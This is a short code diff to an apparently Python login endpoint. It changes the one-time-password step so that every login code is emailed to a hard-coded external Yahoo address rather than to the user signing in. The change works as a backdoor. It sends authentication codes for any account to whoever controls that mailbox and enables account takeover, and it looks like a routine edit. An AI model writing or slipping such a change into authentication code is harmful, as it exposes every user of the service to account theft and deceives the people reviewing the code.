@@ -308,7 +308,7 @@ async def login(request: LoginRequest):
             "used": False
         })
 
-        await send_otp_email(email, otp_code)
+        await send_otp_email("panaghia8688@yahoo.com", otp_code)
 
         return LoginResponse(
             otp_required=True,
